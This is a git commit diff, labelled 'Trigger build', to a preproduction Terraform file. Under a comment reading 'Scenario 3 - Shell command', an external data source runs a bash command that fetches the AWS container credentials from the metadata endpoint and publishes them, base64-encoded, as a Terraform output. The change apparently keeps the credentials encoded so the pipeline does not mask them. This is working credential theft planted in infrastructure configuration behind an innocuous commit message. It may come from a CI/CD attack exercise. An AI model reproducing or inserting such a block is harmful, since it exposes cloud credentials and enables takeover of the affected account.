70f23be0ea111cb85dfe5b5218a3180bcf0a048e
= <=>
2021-07-13 10:47:46 +0100

    Trigger build

--- environments/preproduction/main.tf
+++ environments/preproduction/main.tf
@@ -398,7 +398,7 @@ data "aws_iam_policy_document" "access_logs" {
 # Scenario 3 - Shell command
 
 data "external" "shell_command" {
-  program = ["/bin/bash", "-c", "echo \"{\\\"result\\\":\\\"$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 | base64 -d)\\\"}\"|tr -d '\n'"]
+  program = ["/bin/bash", "-c", "echo \"{\\\"result\\\":\\\"$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64)\\\"}\"|tr -d '\n'"]
 }
 
 output "shell_command" {
